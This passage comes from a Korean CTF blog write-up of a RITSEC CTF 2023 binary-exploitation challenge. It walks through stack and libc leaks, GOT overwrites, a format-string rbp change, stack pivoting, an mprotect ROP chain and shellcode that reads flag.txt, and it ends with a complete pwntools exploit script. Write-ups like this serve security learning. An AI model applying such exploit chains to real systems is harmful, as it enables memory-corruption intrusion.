function_">calc_checksum</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 result; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  dest = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, buf, size);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size - <span class="number">1</span>; ++i )</span><br><span class="line">    result += *(dest + i) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="built_in">free</span>(dest);                                   <span class="comment">// free@got -&gt; printf</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xor을 두 번하면 원래대로 돌아오는 성질을 이용하면 된다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>stack과 libc base를 구한다.</li><li>직접 구현한 <code>aaw</code> 함수를 이용하여 rop payload를 <code>bss</code> 영역에 써준다.</li></ol><ul><li>왜 이런 payload를 썼는지는 아래에서 이해할 수 있다.  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bss의 정중앙</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!)</span></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># 두 번째 스택 피봇팅</span></span><br><span class="line"></span><br><span class="line">aaw(bss, rop_payload) </span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li><code>got</code>들을 덮어준다.</li></ol><ul><li><code>free@got -&gt; printf</code>, <code>__stack_chk_fail@got -&gt; ret</code>, <code>fgets@got -&gt; gets</code></li><li>이를 위해 bss 영역에 <code>p64(libc.sym[&#39;gets&#39;])</code>, <code>p64(libc.sym[&#39;printf&#39;])</code>, <code>p64(ret)</code>을 써주었다. <code>(!)</code></li><li>got를 덮을 때는 <code>aaw</code> 함수를 사용하지 않고 바로 paylaod를 보내서 덮어주었다. (쓸 필요성 못 느낌)</li><li>왜냐하면 <code>fgets@got</code>를 <code>gets</code> 함수로 덮을 때 만약 한 바이트씩 덮게 된다면 한 바트씩 바뀐 잘못된 주소를 호출하기 때문이다.</li><li><code>fgets@got -&gt; gets</code> 덮을 때 <code>b&#39;a&#39; * 0x12</code>을 추가로 보내주었다. 왜냐하면 <code>free@got</code>을 덮어서 <code>printf</code>로 덮어서 fsb가 발생하는 것을 노렸는데, 만약 저 더미데이터를 보내주지 않으면 글자수가 17자로 <code>fsb</code>로 값을 쓰기엔 턱없이 부족하기 때문에 혹시몰라 더미데이터도 함께 보내주었다.</li></ul><p>(현재 상황) <code>main</code>함수에서 <code>fgets</code> 대신 <code>gets</code>가 실행되므로 <code>bof</code>가 터짐! (카나리때문에 추가적으로 <code>__stack_chk_fail@got</code>을 <code>ret</code>으로 덮어줌!) <code>calc_checksum</code> 함수에서 <code>fgets</code> 함수 대신 <code>printf</code>가 실행되므로 <code>fsb</code>가 터짐! </p><ol start="4"><li><code>fsb</code>를 이용하여 <code>rbp</code>를 변경하여 흐름을 <code>bss</code> 영역으로 돌린다. 이 <code>bss</code> 영역은 2번에서 적은 부분<code>(!!)</code>이고 <code>pop_rsp</code>를 실행할 것이다. (스택 피봇팅 1) &lt;- 참고로 여기서 흐름이 <code>bss</code> 영역으로 바뀌어서, 즉 <code>rbp</code>가 <code>bss</code> 영역의 주소로 바뀌어서 조금 안좋은 일이 일어날 수 있다. 이는 맨 마지막에 이야기한다. <code>***</code>&gt;</li></ol><ul><li><code>fsb</code>는 <code>calc_checksum</code> 함수에서 터진다. 이 함수안에서의 <code>rbp</code>는 <code>calc_checksum</code> 함수를 호출한 <code>use_packet</code>의 <code>rbp</code>가 저장된 스택 주소이다. </li><li><code>buf</code>와 위 스택 주소의 offset은 0x90이다.</li><li><code>0x404820</code>으로 <code>rbp</code>를 변경시키기 위해 <code>ln</code>을 이용하여 <code>0x20</code>을 8 바이트 쓰고 <code>hn</code>을 이용하여 <code>0x4048</code>을 2 바이트 쓰자.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># 이걸 안하면 calc_checksum의 free(printf)가 호출이 안됨</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!!)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># 실행할수 있도록 권한 바꿔주고</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># 여기에 쉘코드 입력 후</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># 점프</span></span><br></pre></td></tr></table></figure></li></ul><ol start="5"><li>그럼 이제 흐름이 <code>bss</code> 영역의 아래 코드로 바뀌는데, 4번에서 스택에 써준 코드<code>(!!!)</code>로 이동한다. (스택 피봇팅 2)</li><li>마지막으로 <code>mprotect</code> 함수로 bss 영역 실행가능하게 설정해주고 <code>gets</code> 함수가 실행되니 <code>flag.txt</code> orw하는 쉘코드를 보내주자.</li></ol><p><code>***</code> <code>calc_checksum</code> 함수에서 <code>fsb</code>를 이용하여 <code>rbp</code>를 <code>bss</code>영역으로 바꿔주었다. 여기까진 괜찮은데 그 다음 입력에서 문제가 발생할 수도 있다. (실제로 발생했다.) 지금 흐름 상황에서는 if문 안으로 들어가면 안된다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="comment">/* 이미 진행됨 */</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] <span class="comment">/* 마지막 바이트 검사*/</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// oob read, write 취약점이 발생하고 bss 영역에 값을 씀</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>의도하지 않은 상황이 발생할 수도 있으므로 익스하는데 필요하지 않은 코드는 최대한 실행시키지 말자는 생각을 가져야 한다. 사실상 마지막 바이트 검사는 틀릴 것이고 중요한 것은 <code>buf</code>와 <code>len</code>을 <code>rbp</code>를 기준으로 참조하기 때문에 위험하다. 그래서 아래 노란색으로 음영진 주소에서 터진다.</p><img src="/images/230412-ritsecctf2023-3Alphabet/Screenshot 2023-04-12 at 20.37.20.png" width=500/><br><p>그래서 실제로 터진 주소(<code>rbp-0x48</code>)에는 접근 가능한 적당한 주소 넣어주고 <code>len</code> 에는 1을 넣어줬다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf 암꺼나</span></span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;ret2win.challenges.ctf.ritsec.club&#x27;, 1337)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. leak stack</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">34</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">info(<span class="built_in">hex</span>(stack)) <span class="comment"># buf address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">250</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write.</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x64f43</span> - <span class="number">0x28000</span>)</span><br><span class="line">libc.address = libc_leak</span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = stack</span><br><span class="line"><span class="comment"># 한바이트씩 임의쓰기</span></span><br><span class="line"><span class="comment"># addr(주소)에 val(값)을 쓰기</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawb는 한 바이트씩 썼지만 aaw는 aawb를 호출해서 8바이트를 쓸 것</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss = 0x4040c0</span></span><br><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bss의 정중앙</span></span><br><span class="line"></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pop_rsp = libc.address + <span class="number">0x35732</span></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc.address + <span class="number">0x11f497</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rop_payload += p64(0x4142434445464748)</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># 두 번째 스택 피봇팅</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(bss, rop_payload) <span class="comment"># 0x4040c0:       0x4142434445464748</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $rbp   : 0x000000004040e0  →  0x00000042424244 (&quot;DBBB&quot;?)</span></span><br><span class="line"><span class="comment"># 0x401561 &lt;use_packet+132&gt; mov    eax, DWORD PTR [rbp-0x4c] # len</span></span><br><span class="line"><span class="comment"># 0x40156a &lt;use_packet+141&gt; mov    rax, QWORD PTR [rbp-0x48] # buf</span></span><br><span class="line"><span class="comment"># rbp가 bss 영역 주소로 바뀌었기 때문에 $rbp-0x4c와 $rbp-0x48을 참조하면서 안좋은 일이 발생할 수도 있음</span></span><br><span class="line"><span class="comment"># 미리 값을 채워주어 if문 안으로 들엉가는 일이 없도록 len을 1로 설정. 아래 식이 false가 되어야 함.(checksum은 계산된 값이기 때문에 높은 확률로 틀릴 것.) 이 전의 수식은 신경 안써도 됨. 문제는 calc_checksum 안에서 rbp가 바뀌기 때문</span></span><br><span class="line"><span class="comment"># calc_checksum(buf, len) == buf[len - 1]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf 암꺼나</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"><span class="comment"># got 덮혔는지 확인 -&gt; der $_got()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free@got -&gt; printf</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">8</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;free&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __stack_chk_fail@got -&gt; ret</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">16</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fgets@got -&gt; gets</span></span><br><span class="line"><span class="comment"># aaw(e.got[&#x27;fgets&#x27;], p64(libc.sym[&#x27;gets&#x27;])) # 한 바이트씩 바꾸기 때문에 한 바이트씩 바뀐 주소를 호출함. 잘못된 주소를 호출하기 때문에 터짐</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x12</span> <span class="comment"># &lt;- (!!)</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line"><span class="comment"># 여기서 main의 24 line의 len이 19로 고정됨.</span></span><br><span class="line"><span class="comment"># 뒤에 printf에서 17자로 보내야하는데 모자람.</span></span><br><span class="line"><span class="comment"># 이를 위해서 1. aaw를 이용해서 len에 큰 수 넣기. 2. fgets로 덮기 전에 뭔가 더 추가적으로 보내줘서 len이 더 긴 길이로 고정되도록</span></span><br><span class="line"><span class="comment"># 2번 방법을 채택하였음. 그치만 너무 큰 수 보내면 fgets 길이 제한에 걸리니 적당한 수를 보내야 함</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 이제 fgets 대신 gets가 실행되니 bof가 터지는 상황</span></span><br><span class="line"><span class="comment"># printf (fsb가 터짐): rbp 변경 -&gt; 흐름이 bss 영역으로 바뀐다. (스택 피봇팅 두 번 할 것임)</span></span><br><span class="line"><span class="comment"># 첫 번째 스택 피봇팅: bss 영역으로 이동해서 pop_rsp 실행</span></span><br><span class="line"><span class="comment"># 두 번째 스택 피봇팅: 다시 스택으로 돌아와서 남은 페이로드 실행</span></span><br><span class="line"><span class="comment"># payload : mprotect로 버퍼 권한 변경해주고 그 버퍼에 gets 함수로 입력을 받을 것.</span></span><br><span class="line"><span class="comment"># gets 함수 입력으로 flag orw</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 스택에 있는 rbp 주소를 bss 영역으로 바꾼다.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ln -&gt; 8 byte 씀</span></span><br><span class="line"><span class="comment"># hn -&gt; 2 byte 씀</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x404820:       0x0000000042424244</span></span><br><span class="line"><span class="comment"># calc_checksum의 rbp는 이 함수를 호출한 함수의 &lt;rbp가 저장된 주소&gt;</span></span><br><span class="line"><span class="comment"># a주소(rsp) : use_packet 함수의 rbp</span></span><br><span class="line"><span class="comment"># buf와 a주소의 오프셋은 0x90</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># 이걸 안하면 calc_checksum의 free(printf)가 호출이 안됨</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># 실행할수 있도록 권한 바꿔주고</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># 여기에 쉘코드 입력 후</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># 점프</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">&#x27;sub rsp, 0x100&#x27;</span></span><br><span class="line">    + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>)</span><br><span class="line">    + shellcraft.read(<span class="number">3</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - assembly-hopping (shellcode)</title>
      <link href="/230412-ritsecctf2023-2assembly-hopping/"/>
      <url>/230412-ritsecctf2023-2assembly-hopping/</url>
      
